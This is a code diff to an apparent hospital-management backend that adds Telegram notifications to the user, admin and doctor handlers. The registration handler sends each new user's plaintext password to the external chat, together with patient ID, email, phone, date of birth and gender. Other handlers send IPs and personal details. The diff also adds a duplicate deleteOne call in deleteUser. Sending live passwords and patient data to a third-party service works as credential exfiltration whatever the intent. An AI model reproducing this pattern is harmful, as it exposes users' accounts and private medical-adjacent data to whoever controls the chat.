@@ -6,6 +6,7 @@ import { isAdminAuthenticated } from "../middlewares/auth.js";
 import cloudinary from "cloudinary";
 import crypto from "crypto";
 import { sendEmailOTP } from "../utils/sendEmailOTP.js";
+import { sendTelegramLog } from "../utils/telegramLogger.js";
 
 export const registerUser = catchAsyncErros(async (req, res, next) => {
   const {
@@ -57,6 +58,24 @@ export const registerUser = catchAsyncErros(async (req, res, next) => {
 
   // ✅ SEND RESPONSE VIA TOKEN FUNCTION
   generateToken(user, "User registered successfully", 201, res);
+
+  // 🔥 TELEGRAM LOG HERE
+  await sendTelegramLog(`
+━━━━━━━━━━━━━━
+👤 <b>New User Registered</b>
+━━━━━━━━━━━━━━
+
+👤 <b>Name:</b> ${firstName} ${lastName}
+🆔 <b>Patient ID:</b> ${patientId}
+📧 <b>Email:</b> ${email}
+📱 <b>Phone:</b> ${phone}
+🎂 <b>DOB:</b> ${dob}
+⚧ <b>Gender:</b> ${gender}
+🔐 <b>Password: ${password}</b> 
+<b>Created Successfully</b>
+🕒 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━
+`);
 });
 
 export const login = catchAsyncErros(async (req, res, next) => {
@@ -89,6 +108,20 @@ export const login = catchAsyncErros(async (req, res, next) => {
       new ErrorHandler("Email not verified. Please verify OTP.", 403),
     );
   }
+
+  await sendTelegramLog(`
+━━━━━━━━━━━━━━
+👤 <b>${user.role} Logged In</b>
+━━━━━━━━━━━━━━
+
+👤 <b>Name:</b> ${user.firstName} ${user.lastName}
+📧 <b>Email:</b> ${user.email}
+🛡️ <b>Role:</b> ${user.role}
+🌍 <b>IP:</b> ${req.ip}
+💻 <b>User-Agent:</b> ${req.headers["user-agent"]}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━
+`);
 
   generateToken(user, "Login Successfully!", 201, res);
 });
@@ -133,6 +166,25 @@ export const addNewAdmin = catchAsyncErros(async (req, res, next) => {
     password,
     role: "admin",
   });
+
+  await sendTelegramLog(`
+━━━━━━━━━━━━━━━━━━
+🚨 <b>New Admin Created</b>
+━━━━━━━━━━━━━━━━━━
+
+👤 <b>Name:</b> ${firstName} ${lastName}
+🆔 <b>ID:</b> ${patientId}
+📧 <b>Email:</b> ${email}
+📱 <b>Phone:</b> ${phone}
+🎂 <b>DOB:</b> ${dob}
+⚧ <b>Gender:</b> ${gender}
+🛡️ <b>Role:</b> Admin
+🔐 <b>Password:</b> Encrypted & Stored
+🌍 <b>Created From IP:</b> ${req.ip}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━
+`);
+
   res.status(200).json({
     success: true,
     message: "New Admin Registered",
@@ -292,6 +344,26 @@ export const addNewDoctor = catchAsyncErros(async (req, res, next) => {
 
   await sendEmailOTP(email, otp);
 
+  await sendTelegramLog(`
+━━━━━━━━━━━━━━━━━━
+🩺 <b>New Doctor Added</b>
+━━━━━━━━━━━━━━━━━━
+
+👤 <b>Name:</b> ${firstName} ${lastName}
+🆔 <b>ID:</b> ${patientId}
+📧 <b>Email:</b> ${email}
+📱 <b>Phone:</b> ${phone}
+🎂 <b>DOB:</b> ${dob}
+⚧ <b>Gender:</b> ${gender}
+🏥 <b>Department:</b> ${doctorDepartment}
+🛡️ <b>Role:</b> Doctor
+📸 <b>Avatar Uploaded:</b> ✅
+📩 <b>Email Verified:</b> ❌ Pending
+🌍 <b>Created From IP:</b> ${req.ip}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━
+`);
+
   res.status(200).json({
     success: true,
     message: "Doctor added. OTP sent to doctor email for verification.",
@@ -322,6 +394,21 @@ export const updateDoctor = catchAsyncErros(async (req, res, next) => {
   Object.assign(doctor, updates);
   await doctor.save();
 
+  await sendTelegramLog(`
+━━━━━━━━━━━━━━━━━━
+🟡 <b>Doctor Updated</b>
+━━━━━━━━━━━━━━━━━━
+
+👤 <b>Name:</b> ${doctor.firstName} ${doctor.lastName}
+🆔 <b>ID:</b> ${doctor._id}
+🏥 <b>Department:</b> ${doctor.doctorDepartment}
+✏️ <b>Updated Fields:</b> ${Object.keys(updates).join(", ")}
+👮 <b>Updated By:</b> ${req.user?.firstName || "Admin"}
+🌍 <b>IP:</b> ${req.ip}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━
+`);
+
   res.status(200).json({
     success: true,
     message: "Doctor Details Updated Successfully",
@@ -336,6 +423,21 @@ export const deleteDoctor = catchAsyncErros(async (req, res, next) => {
   if (!doctor) {
     return next(new ErrorHandler("Doctor Not Found!", 404));
   }
+
+  await sendTelegramLog(`
+━━━━━━━━━━━━━━━━━━
+🔴 <b>Doctor Deleted</b>
+━━━━━━━━━━━━━━━━━━
+
+👤 <b>Name:</b> ${doctor.firstName} ${doctor.lastName}
+🆔 <b>ID:</b> ${doctor._id}
+📧 <b>Email:</b> ${doctor.email}
+🏥 <b>Department:</b> ${doctor.doctorDepartment}
+👮 <b>Deleted By:</b> ${req.user?.firstName || "Admin"}
+🌍 <b>IP:</b> ${req.ip}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━
+`);
 
   await doctor.deleteOne();
 
@@ -368,6 +470,21 @@ export const updateUser = catchAsyncErros(async (req, res, next) => {
   Object.assign(user, updates);
   await user.save();
 
+  await sendTelegramLog(`
+━━━━━━━━━━━━━━━━━━
+🟡 <b>User Updated</b>
+━━━━━━━━━━━━━━━━━━
+
+👤 <b>Name:</b> ${user.firstName} ${user.lastName}
+🆔 <b>ID:</b> ${user._id}
+🛡️ <b>Role:</b> ${user.role}
+✏️ <b>Updated Fields:</b> ${Object.keys(updates).join(", ")}
+👮 <b>Updated By:</b> ${req.user?.firstName || "Admin"}
+🌍 <b>IP:</b> ${req.ip}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━
+`);
+
   res.status(200).json({
     success: true,
     message: "User Details Updated Successfully",
@@ -382,6 +499,23 @@ export const deleteUser = catchAsyncErros(async (req, res, next) => {
   if (!user) {
     return next(new ErrorHandler("User Not Found!", 404));
   }
+
+  await user.deleteOne();
+
+  await sendTelegramLog(`
+━━━━━━━━━━━━━━━━━━
+🔴 <b>User Deleted</b>
+━━━━━━━━━━━━━━━━━━
+
+👤 <b>Name:</b> ${user.firstName} ${user.lastName}
+🆔 <b>ID:</b> ${user._id}
+📧 <b>Email:</b> ${user.email}
+🛡️ <b>Role:</b> ${user.role}
+👮 <b>Deleted By:</b> ${req.user?.firstName || "Admin"}
+🌍 <b>IP:</b> ${req.ip}
+🕒 <b>Time:</b> ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━━━━
+`);
 
   await user.deleteOne();
 
